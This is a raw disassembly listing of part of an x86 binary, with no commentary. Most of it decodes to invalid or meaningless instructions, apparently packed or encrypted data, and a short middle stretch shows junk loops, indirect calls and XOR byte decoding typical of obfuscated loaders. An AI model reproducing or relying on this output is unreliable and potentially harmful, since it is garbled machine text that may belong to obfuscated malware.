  410066:	mov    al,ds:0xef92b75a
  41006b:	mov    esp,0x12fe3f3c
  410070:	out    dx,al
  410071:	pop    ecx
  410072:	jae    0x41006f
  410074:	clc    
  410075:	mov    ebp,0xad2f2be0
  41007a:	xchg   ebp,eax
  41007b:	(bad)  
  41007c:	mov    al,0x97
  41007e:	int3   
  41007f:	loop   0x4100a7
  410081:	(bad)  
  410082:	pop    esp
  410083:	adc    ebp,DWORD PTR [ecx]
  410085:	and    eax,0xc70621cf
  41008a:	xor    BYTE PTR [edx],0xb8
  41008d:	test   al,0xc3
  41008f:	and    eax,0x91d5f180
  410094:	popf   
  410095:	fistp  QWORD PTR [edx+edi*4]
  410098:	mov    ds:0x4894e6e7,eax
  41009d:	sbb    ch,al
  41009f:	adc    al,0x35
  4100a1:	ins    BYTE PTR es:[edi],dx
  4100a2:	enter  0xe1c3,0xda
  4100a6:	sbb    al,BYTE PTR [ebx-0x20]
  4100a9:	ficomp WORD PTR [ebp+0xf75788a]
  4100af:	jmp    0x5291dc3c
  4100b4:	jmp    0x4582:0x2be390a0
  4100bb:	mov    edx,0x2a7e35c
  4100c0:	and    bl,BYTE PTR [ecx]
  4100c2:	mov    ds:0xf98a42ad,eax
  4100c7:	and    BYTE PTR [ebx+0x7b],bl
  4100ca:	sti    
  4100cb:	clc    
  4100cc:	fldcw  WORD PTR [edx]
  4100ce:	in     al,dx
  4100cf:	stos   BYTE PTR es:[edi],al
  4100d0:	(bad)  
  4100d1:	(bad)  [eax+0x50]
  4100d4:	mov    ds:0x641ef1a1,eax
  4100d9:	sub    BYTE PTR [edx+ecx*2+0x6a],bl
  4100dd:	and    BYTE PTR [ecx-0x17],0xfd
  4100e1:	sti    
  4100e2:	aad    0xa3
  4100e4:	cli    
  4100e5:	sbb    ecx,DWORD PTR [eax]
  4100e7:	in     al,dx
  4100e8:	std    
  4100e9:	je     0x410162
  4100eb:	xchg   ebp,eax
  4100ec:	adc    edx,ebx
  4100ee:	and    al,0xaf
  4100f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100f1:	jecxz  0x41009e
  4100f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100f4:	inc    ebp
  4100f5:	test   BYTE PTR [ecx-0x44],bl
  4100f8:	ror    DWORD PTR [ecx],cl
  4100fa:	fs mov bh,0x63
  4100fd:	test   DWORD PTR [esi-0x6a],esi
  410100:	jne    0x4100f9
  410102:	sub    eax,0x5a09e29d
  410107:	xchg   ebx,eax
  410108:	mov    ds:0x696d31d6,eax
  41010d:	or     ebp,eax
  41010f:	pop    ecx
  410110:	into   
  410111:	push   es
  410112:	(bad)  
  410113:	imul   esi,DWORD PTR [edi],0x4f30ca10
  410119:	in     eax,dx
  41011a:	rcl    ebx,1
  41011c:	add    al,0xa5
  41011e:	dec    edi
  41011f:	mov    WORD PTR [eax-0x57],ds
  410122:	scas   al,BYTE PTR es:[edi]
  410123:	fwait
  410124:	dec    ebx
  410125:	mov    bh,0xda
  410127:	or     eax,0x9640fec5
  41012c:	retf   
  41012d:	js     0x4100d0
  41012f:	pop    ecx
  410130:	adc    BYTE PTR [eax-0x41],dh
  410133:	mov    ebp,0x67248f7f
  410138:	(bad)  
  410139:	and    eax,0xc73fb48c
  41013e:	jecxz  0x410156
  410140:	pop    edx
  410141:	pop    ebp
  410142:	test   BYTE PTR [edi-0x4f2a3cba],ah
  410148:	dec    ebx
  410149:	mov    edi,0xa93c6151
  41014e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41014f:	inc    edi
  410150:	scas   al,BYTE PTR es:[edi]
  410151:	mul    BYTE PTR [esi-0x61]
  410154:	dec    esi
  410155:	dec    edi
  410156:	inc    edi
  410157:	xchg   esi,eax
  410158:	sub    eax,DWORD PTR ds:0x5a1428d2
  41015e:	sbb    DWORD PTR [ecx],0x53105667
  410164:	adc    eax,0xdb41ace
  410169:	push   0x6d
  41016b:	pop    ss
  41016c:	xor    DWORD PTR [ebx-0x5d],eax
  41016f:	imul   BYTE PTR [ebp+0x5e25d752]
  410175:	mov    bl,0xd4
  410177:	inc    edi
  410178:	aaa    
  410179:	xor    eax,0x66111613
  41017e:	cmp    eax,0x63ed1dbe
  410183:	fmul   DWORD PTR [edi+0x11]
  410186:	mov    ebp,esi
  410188:	cmp    eax,0x10a8f677
  41018d:	ret    
  41018e:	and    DWORD PTR [ecx-0x23],0xa4af0005
  410195:	mov    dl,0x17
  410197:	sbb    ecx,DWORD PTR [ebx-0x6a28985]
  41019d:	adc    BYTE PTR [edi+0x7a62c2ee],ch
  4101a3:	daa    
  4101a4:	sbb    DWORD PTR [esp+ecx*1+0x10],edi
  4101a8:	or     eax,0x7f9cb63d
  4101ad:	sti    
  4101ae:	retf   
  4101af:	out    dx,eax
  4101b0:	(bad)  
  4101b1:	loope  0x4101e7
  4101b3:	or     al,0x7c
  4101b5:	mov    dh,0xd4
  4101b7:	sub    eax,0x669709b3
  4101bc:	pop    edi
  4101bd:	jmp    0x8dddcae7
  4101c2:	jp     0x4101a0
  4101c4:	adc    BYTE PTR [eax+0xc2db591],dl
  4101ca:	and    eax,0x26e1e0b8
  4101cf:	dec    edi
  4101d0:	adc    DWORD PTR [esi+edx*4+0x16],0xffffffd0
  4101d5:	cli    
  4101d6:	push   cs
  4101d7:	or     ebp,eax
  4101d9:	(bad)  
  4101da:	fstp   TBYTE PTR [edi+eiz*2-0x389cbacb]
  4101e1:	cdq    
  4101e2:	adc    ah,BYTE PTR [eax+ebp*2-0x6d]
  4101e6:	fcmovb st,st(1)
  4101e8:	add    al,0xdf
  4101ea:	in     eax,dx
  4101eb:	out    0xec,al
  4101ed:	ret    0x69ee
  4101f0:	mov    al,0x67
  4101f2:	das    
  4101f3:	mov    bl,0x18
  4101f5:	cdq    
  4101f6:	div    DWORD PTR [ebx+0xdbc7f9c]
  4101fc:	pusha  
  4101fd:	mov    ah,0xc9
  4101ff:	div    ecx
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43369f
  41021e:	adc    DWORD PTR ds:0x4336d7,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43360b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x43372b,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x4336df
  41026b:	or     DWORD PTR ds:0x4336d7,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x4336ab,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x4336ab
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x4336ab,ecx
  410291:	cmp    DWORD PTR ds:0x4336ab,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x4336ab,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x4336ab,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x4336ab
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x4336ab,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433603
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x4336e7,0x43369f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x4336e3,0x433697
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x433657
  41031a:	sub    DWORD PTR ds:0x43361f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x43365b,0x0
  410338:	mov    ecx,DWORD PTR ds:0x43365b
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x43365b,ecx
  410345:	cmp    DWORD PTR ds:0x43365b,0x25
  41034c:	jne    0x410362
  410352:	push   0x4337af
  410357:	push   0x4337ef
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x43365b,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43369f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433713,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433713
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433713,ecx
  41038f:	cmp    DWORD PTR ds:0x433713,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x4336e7
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433713,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433713
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433713,ecx
  4103c8:	cmp    DWORD PTR ds:0x433713,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x43365f,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x433657,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x433657
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x433657,esi
  4103ff:	cmp    DWORD PTR ds:0x433657,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x433657,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0xfd,al
  41049c:	xchg   DWORD PTR [edx+0x7eb0dc63],edx
  4104a2:	jle    0x410453
  4104a4:	jl     0x410524
  4104a6:	jle    0x4104e5
  4104a8:	adc    ecx,edx
  4104aa:	sub    dl,bh
  4104ac:	test   DWORD PTR [eax],0x45f3760f
  4104b2:	push   eax
  4104b3:	pusha  
  4104b4:	sahf   
  4104b5:	(bad)  
  4104b6:	mov    eax,ds:0xf278cb0f
  4104bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104bc:	add    DWORD PTR [edx+0x68],0x9
  4104c0:	push   edx
  4104c1:	mov    cl,0xa8
  4104c3:	outs   dx,BYTE PTR ds:[esi]
  4104c4:	xor    bl,ch
  4104c6:	pop    ebp
  4104c7:	pop    edi
  4104c8:	test   BYTE PTR [eax],dh
  4104ca:	sbb    eax,0xd843974
  4104cf:	push   edi
  4104d0:	jo     0x4104b7
  4104d2:	inc    ebx
  4104d3:	fwait
  4104d4:	xchg   ecx,eax
  4104d5:	std    
  4104d6:	sub    DWORD PTR [edi],esi
  4104d8:	(bad)  
  4104da:	push   cs
  4104db:	add    DWORD PTR ss:0x73e5a5d0,edx
  4104e2:	xchg   ebp,eax
  4104e3:	mov    eax,0xd9ab2417
  4104e8:	mov    bl,0x65
  4104ea:	test   BYTE PTR [ebx+edx*4-0x3663615a],0xcc
  4104f2:	inc    esp
  4104f3:	mov    al,ds:0x7194162c
  4104f8:	sub    al,0xf8
  4104fa:	imul   edx,DWORD PTR [edi+edx*2+0x2f],0x26338c26
  410502:	sub    eax,0xe6864a54
  410507:	jmp    0xe0e5:0x3487d868
  41050e:	dec    edi
  41050f:	or     BYTE PTR [edx],dl
  410511:	mov    ebx,0x367823a
  410516:	or     bh,dh
  410518:	pop    esp
  410519:	xchg   DWORD PTR [edx+0x27],edx
  41051c:	ins    DWORD PTR es:[edi],dx
  41051d:	add    esi,ecx
  41051f:	mov    ah,0x28
  410521:	sub    eax,0x9f52d0ca
  410526:	and    eax,0x5a44fa32
  41052b:	outs   dx,BYTE PTR ds:[esi]
  41052c:	push   es
  41052d:	pop    edx
  41052e:	add    BYTE PTR [edx],ch
  410530:	int3   
  410531:	daa    
  410532:	add    ch,BYTE PTR [eax-0x60]
  410535:	das    
  410536:	fistp  QWORD PTR [esi-0x8]
  410539:	jp     0x4104ce
  41053b:	lods   eax,DWORD PTR ds:[esi]
  41053c:	nop
  41053d:	mov    dl,0x5d
  41053f:	(bad)
  410542:	clc    
  410543:	jne    0x410510
  410545:	jne    0x410515
  410547:	mov    WORD PTR [edx+0x3f],es
  41054a:	lds    ebp,FWORD PTR [ecx-0x19]
  41054d:	mov    eax,0x2d697591
  410552:	sti    
  410553:	shl    BYTE PTR [ebx],1
  410555:	jo     0x410511
  410557:	xchg   ebp,eax
  410558:	std    
  410559:	ret    0x8b49
  41055c:	or     BYTE PTR [edx],ah
  41055e:	add    DWORD PTR [edx],esi
  410560:	(bad)  
  410561:	stc    
  410562:	in     al,dx
  410563:	rcl    DWORD PTR [eax],0x5f
  410566:	fisub  DWORD PTR [ebp-0x3e4df42b]
  41056c:	pushf  
  41056d:	mov    bl,0xa4
  41056f:	into   
  410570:	and    eax,0xc8b4bd35
  410575:	xchg   ecx,eax
  410576:	loop   0x41057e
  410578:	and    al,0x27
  41057a:	(bad)  
  41057b:	fdivr  QWORD PTR [ebp+0x116c9552]
  410581:	daa    
  410582:	inc    edx
  410583:	popf   
  410584:	mov    DWORD PTR [ebx+0x7a578d0f],ecx
  41058a:	xchg   edx,eax
  41058b:	(bad)  
  41058d:	jmp    0xc1e9580d
  410592:	popf   
  410593:	add    DWORD PTR [ebx+0x3f],edx
  410596:	sbb    eax,0x9091eff5
  41059b:	mov    eax,ds:0xa3187068
  4105a0:	cmc    
  4105a1:	mov    esp,0x78a738b5
  4105a6:	adc    eax,0xff23da12
  4105ab:	pop    edx
  4105ac:	shr    BYTE PTR [ecx],0x52
  4105af:	mov    eax,0xb891c50c
  4105b4:	outs   dx,BYTE PTR ds:[esi]
  4105b5:	lds    esi,FWORD PTR [esi-0x15]
  4105b8:	mov    ds:0xe2a3672e,al
  4105bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105be:	test   BYTE PTR [edx+0x46a892b8],cl
  4105c4:	sbb    bh,ah
  4105c6:	arpl   si,ax
  4105c8:	aad    0x4f
  4105ca:	mov    dh,0xb8
  4105cc:	repz sbb dh,cl
  4105cf:	cld    
  4105d0:	dec    esi
  4105d1:	js     0x41062d
  4105d3:	sub    al,0x50
  4105d5:	dec    ebx
  4105d6:	mov    dh,0x83
  4105d8:	fmul   DWORD PTR [eax+0x66]
  4105db:	retf   
  4105dc:	inc    esi
  4105dd:	push   ebp
  4105de:	mov    ebp,0x870ea03c
  4105e3:	sub    edi,DWORD PTR [ebp+0x6de261b0]
  4105e9:	jno    0x410619
  4105eb:	pop    edi
  4105ec:	in     al,dx
  4105ed:	xchg   ebp,eax
  4105ee:	xchg   esp,eax
  4105ef:	out    dx,eax
  4105f0:	outs   dx,DWORD PTR ds:[esi]
  4105f1:	xlat   BYTE PTR ds:[ebx]
  4105f2:	inc    edi
  4105f3:	jl     0x4105c8
  4105f5:	ss mov bl,0xf0
  4105f8:	lods   eax,DWORD PTR ds:[esi]
  4105f9:	ja     0x4105c5
  4105fb:	leave  
  4105fc:	sti    
  4105fd:	jmp    0x3689:0x33d35992
  410604:	pop    ds
  410605:	retf   0xfff4
  410608:	mov    edx,DWORD PTR [ecx]
  41060a:	ins    DWORD PTR es:[edi],dx
  41060b:	rcr    DWORD PTR [ecx+0x55],cl
  41060e:	fcmovne st,st(5)
  410610:	imul   DWORD PTR [esi]
  410612:	repnz xor esp,ebp
  410615:	test   al,0x2c
  410617:	add    DWORD PTR [ecx-0x565a2357],0x9467f640
  410621:	cmp    al,0x35
  410623:	fdiv   QWORD PTR ds:0x17cc70ea
  410629:	adc    BYTE PTR es:[ebx-0x13563994],bh
  410630:	dec    ebp
  410631:	ins    BYTE PTR es:[edi],dx
  410632:	sbb    eax,0x9f387c4e
  410637:	cmp    ebp,DWORD PTR ds:0xbcfc910d
  41063d:	into   
  41063e:	pop    esi
  41063f:	ror    BYTE PTR [ebp-0x76],0x36
  410643:	frstor [ebx-0x50]
  410646:	adc    al,0x70
  410648:	xchg   ebp,eax
  410649:	addr16 test ah,0x4e
  41064d:	sub    ebx,ebx
  41064f:	ja     0x4106cb
  410651:	retf   
  410652:	(bad)  
  410653:	fldcw  WORD PTR [edx]
  410655:	add    edx,DWORD PTR [ecx-0x4]
  410658:	cvtps2pd xmm6,QWORD PTR [ecx+ebx*8]
  41065c:	sub    eax,0xd3976631
  410661:	jp     0x410698
  410663:	sub    esp,DWORD PTR [ebp+0x37]
  410666:	aad    0xa
  410668:	sub    DWORD PTR [ebx-0x56],esi
  41066b:	imul   edi,DWORD PTR [ebx],0x2e1aadd5
  410671:	inc    ecx
  410672:	sbb    DWORD PTR [edi+eax*4+0x2],eax
  410676:	mov    eax,0x7993d0d3
  41067b:	xchg   ecx,eax
  41067c:	mov    edi,0x68485a34
  410681:	sar    BYTE PTR [esp+ebx*2+0x57],cl
  410685:	xchg   ecx,eax
  410686:	les    edx,FWORD PTR [edi-0x21a47370]
  41068c:	push   ebp
  41068d:	dec    ebx
  41068e:	ss jno 0x410707
  410691:	scas   al,BYTE PTR es:[edi]
  410692:	aam    0xce
  410694:	cmp    al,BYTE PTR [eax+0x6923fdd5]
  41069a:	dec    esi
  41069b:	push   ecx
  41069c:	xor    eax,DWORD PTR [edx+0x2f8a7e51]
  4106a2:	xor    al,0x73
  4106a4:	in     al,0x75
  4106a6:	and    edx,esp
  4106a8:	dec    edi
  4106a9:	mov    edx,DWORD PTR [edi+0x3df7d6a6]
  4106af:	xchg   ebx,eax
  4106b0:	pop    es
  4106b1:	imul   edi,DWORD PTR [edx-0x2f31f78],0x17a6d5c5
  4106bb:	mov    cl,0x69
  4106bd:	push   edi
  4106be:	xchg   ebx,eax
  4106bf:	xchg   DWORD PTR [edi+0x5f],esi
  4106c2:	push   es
  4106c3:	fisttp DWORD PTR [eax-0x771a8cfc]
  4106c9:	repnz nop
  4106cb:	pop    esi
  4106cc:	in     eax,0xc1
  4106ce:	sbb    DWORD PTR [edx],edx
  4106d0:	mov    al,ds:0x23fbf93f
  4106d5:	mov    bh,ch
  4106d7:	or     DWORD PTR [edx-0x2b],esi
  4106da:	inc    edx
  4106db:	ffreep st(3)
  4106dd:	repz aaa 
  4106df:	inc    ebx
  4106e0:	stc    
  4106e1:	pop    ds
  4106e2:	lds    ebp,FWORD PTR [esi]
  4106e4:	pop    ebp
  4106e5:	pop    ebx
  4106e6:	add    bh,ch
  4106e8:	(bad)  
  4106e9:	repz lea edx,[ebx-0x42]
  4106ed:	stc    
  4106ee:	mov    ah,0x8a
  4106f0:	inc    esp
  4106f1:	out    0xc6,eax
  4106f3:	adc    DWORD PTR ds:0x8e0f1700,esp
  4106f9:	in     al,dx
  4106fa:	xlat   BYTE PTR ds:[ebx]
  4106fb:	push   ss
  4106fc:	xor    DWORD PTR [edi+0x4c53e35d],edi
  410702:	or     edi,DWORD PTR [ecx+0x60cd1388]
  410708:	pop    ds
  410709:	pop    ebx
  41070a:	in     eax,dx
  41070b:	scas   eax,DWORD PTR es:[edi]
  41070c:	pop    esi
  41070d:	push   cs
  41070e:	les    edi,FWORD PTR [ebp+0x608feb4b]
  410714:	dec    edi
  410715:	inc    ebx
  410716:	fisttp QWORD PTR [edx]
  410718:	addr16 mov ah,0x6a
  41071b:	stc    
  41071c:	mov    ch,0x7f
  41071e:	iret   
  41071f:	dec    edx
  410720:	xor    BYTE PTR [edx-0x5dda76f9],0x26
  410727:	dec    ebx
  410728:	sar    edx,1
  41072a:	jbe    0x41076b
  41072c:	(bad)  
  41072d:	int    0xe9
  41072f:	aas    
  410730:	(bad)  
  410731:	shr    BYTE PTR [edi-0x5f9dad26],1
  410737:	call   0x78fa4fef
  41073c:	cmp    eax,ecx
  41073e:	sub    ebp,ebp
  410740:	stos   BYTE PTR es:[edi],al
  410741:	mov    ch,0xf1
  410743:	mov    DWORD PTR [eax+edx*4+0xcae1b31],ebp
  41074a:	sub    eax,0x5b53cda5
  41074f:	or     BYTE PTR [ecx+0x35bdca27],cl
  410755:	jl     0x41074a
  410757:	test   al,0x8b
  410759:	inc    ebp
  41075a:	hlt    
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0x8a072e5c
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x4107c1
  41078c:	(bad)  
  41078d:	(bad)  
  41078e:	mov    ds:0x206c4f36,eax
  410793:	fistp  DWORD PTR [edi+0x1f3c9fe4]
  410799:	or     al,0xe4
  41079b:	jl     0x4107d1
  41079d:	xchg   DWORD PTR [esp+ecx*4],edi
  4107a0:	sbb    DWORD PTR [ebp-0x1],ebp
  4107a3:	mov    cl,0xb
  4107a5:	clc    
  4107a6:	sar    BYTE PTR [esp+ebx*2-0x1c],0x84
  4107ab:	mov    edi,0xcfa555ef
  4107b0:	xchg   esi,eax
  4107b1:	inc    ecx
  4107b2:	aad    0xd3
  4107b4:	sub    DWORD PTR [eax],eax
  4107b6:	push   ecx
  4107b7:	imul   edi,DWORD PTR [edi+0x510bddad],0xb11f2449
  4107c1:	push   ebp
  4107c2:	push   ecx
  4107c3:	pusha  
  4107c4:	sub    ch,BYTE PTR [ebp-0x40]
  4107c7:	fnstenv [ecx-0x2]
  4107ca:	adc    BYTE PTR [ebx-0x42761b06],cl
  4107d0:	arpl   WORD PTR [ebx],dx
  4107d2:	cmp    BYTE PTR [esi+0x9],cl
  4107d5:	imul   ecx,DWORD PTR [edx],0x73
  4107d8:	or     eax,0xe2ededd7
  4107dd:	cmp    al,0x6a
  4107df:	or     al,0x9f
  4107e1:	sub    eax,0xeb96f57e
  4107e6:	mov    dl,0xde
  4107e8:	push   cs
  4107e9:	xor    dl,BYTE PTR [edx-0x5f]
  4107ec:	out    dx,al
  4107ed:	inc    ebx
  4107ee:	ret    0x6f47
  4107f1:	loope  0x4107dd
  4107f3:	add    dl,BYTE PTR [edi-0x15ad9c21]
  4107f9:	jnp    0x4107a6
  4107fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107fc:	add    bh,cl
  4107fe:	ret    0x74a3
  410801:	sbb    dl,BYTE PTR [esp+eiz*8+0x1f0c14b4]
  410808:	call   0xf1a2:0x1238467
  41080f:	or     al,0xc0
  410811:	xor    ecx,esp
  410813:	push   edi
  410814:	shl    BYTE PTR [eax+0xd7ffc],1
  41081a:	jp     0x4107ad
  41081c:	gs and sp,WORD PTR cs:[edx]
  410821:	dec    esi
  410822:	pop    esi
  410823:	mov    ebp,0xe5933e02
  410828:	sub    BYTE PTR [ebx+eax*2-0x60],bh
  41082c:	pushf  
  41082d:	(bad)  
  41082e:	cmp    al,0x78
  410830:	add    ch,dh
  410832:	imul   eax,DWORD PTR [edi+0x2c],0x9cd757a3
  410839:	and    eax,0xf
  41083c:	sub    DWORD PTR [ecx+0x63aa8d07],edx
  410842:	rcl    DWORD PTR [ecx+0x3a7aea67],0x1a
  410849:	mov    eax,ds:0x9db380ed
  41084e:	sub    esp,0x2bd895cc
  410854:	mov    bl,0xf
  410856:	pop    edx
  410857:	test   DWORD PTR [ecx],edx
  410859:	dec    esp
  41085a:	mov    ebx,ecx
  41085c:	inc    esp
  41085d:	pusha  
  41085e:	(bad)  
  41085f:	pop    ss
  410860:	xchg   ebp,eax
  410861:	mov    ebp,0x6cbae9fa
  410867:	sbb    cl,cl
  410869:	pop    ebp
  41086a:	jp     0x410895
  41086c:	(bad)  
  41086d:	int3   
  41086e:	mov    ah,0x3e
  410870:	lods   al,BYTE PTR ds:[esi]
  410871:	in     eax,dx
  410872:	inc    ecx
  410873:	repnz mov cl,0xc7
  410876:	pop    ss
  410877:	lods   eax,DWORD PTR ds:[esi]
  410878:	inc    ebp
  410879:	mov    esi,0xb13defc5
  41087e:	and    DWORD PTR [ebx-0x6cf23b1b],ebp
  410884:	dec    edx
  410885:	push   esp
  410886:	enter  0xffba,0x55
  41088a:	out    dx,al
  41088b:	movntq QWORD PTR [edx+0x7d],mm0
  41088f:	xchg   esi,eax
  410890:	add    eax,0x7de1726c
  410895:	xchg   DWORD PTR [ebp*8-0x393a88f5],ebx
  41089c:	retf   
  41089d:	dec    edi
  41089e:	xchg   edi,eax
  41089f:	lods   al,BYTE PTR ds:[esi]
  4108a0:	fprem  
  4108a2:	mov    ?,WORD PTR ds:0x27cda544
  4108a8:	dec    eax
  4108a9:	nop
  4108aa:	ja     0x4108be
  4108ac:	stc    
  4108ad:	unpcklps xmm2,XMMWORD PTR [edi]
  4108b0:	mov    bl,0x82
  4108b2:	jnp    0x41084e
  4108b4:	xor    al,ah
  4108b6:	xor    eax,ebx
  4108b8:	jne    0x410928
  4108ba:	jmp    0xcfafb1b7
  4108bf:	std    
  4108c0:	(bad)  
  4108c1:	in     al,0x64
  4108c3:	outs   dx,BYTE PTR ds:[esi]
  4108c4:	aas    
  4108c5:	pop    edx
  4108c6:	inc    esp
  4108c7:	sbb    DWORD PTR [ebx+0x154dd0bf],0xffffffa4
  4108ce:	pushf  
  4108cf:	rcr    edx,1
  4108d1:	repnz lods al,BYTE PTR ds:[esi]
  4108d3:	clc    
  4108d4:	inc    edx
  4108d5:	add    eax,0xe916ebef
  4108da:	pusha  
  4108db:	lock mov ecx,0x69d29e29
  4108e1:	ds jecxz 0x4108b4
  4108e4:	adc    dh,BYTE PTR [ebp+ebx*4-0x6]
  4108e8:	lock jmp 0x410907
  4108eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108ec:	push   0x67
  4108ee:	out    0x5b,al
  4108f0:	pop    ss
  4108f1:	es clc 
  4108f3:	push   edx
  4108f4:	pop    eax
  4108f5:	jle    0x41088d
  4108f7:	repz inc edx
  4108f9:	adc    eax,0x911e8a0
  4108fe:	std    
  4108ff:	retf   0x386a
  410902:	mov    dh,0x1a
  410904:	mov    bh,0xe9
  410906:	and    ch,al
  410908:	inc    esp
  410909:	(bad)  
  41090a:	(bad)  
  41090b:	icebp  
  41090c:	inc    esp
  41090d:	inc    esp
  41090e:	jo     0x410980
  410910:	jmp    DWORD PTR [edi+0x5beea2ad]
  410916:	les    ebx,FWORD PTR [ecx]
  410918:	xor    al,0xe7
  41091a:	sbb    al,0x1e
  41091c:	aad    0x5c
  41091e:	mov    ch,0x92
  410920:	xchg   ebp,eax
  410921:	test   al,0xa5
  410923:	(bad)  
  410924:	push   edx
  410925:	sbb    esi,DWORD PTR [edi-0x696dfb7]
  41092b:	sub    eax,DWORD PTR [ecx-0x28a61b46]
  410931:	push   0x78a25748
  410936:	inc    edi
  410937:	adc    ebx,ebp
  410939:	cmp    al,0x5a
  41093b:	jo     0x4108e7
  41093d:	add    al,0x38
  41093f:	push   esp
  410940:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410941:	push   eax
  410942:	xchg   edi,eax
  410943:	ret    
  410944:	dec    ebx
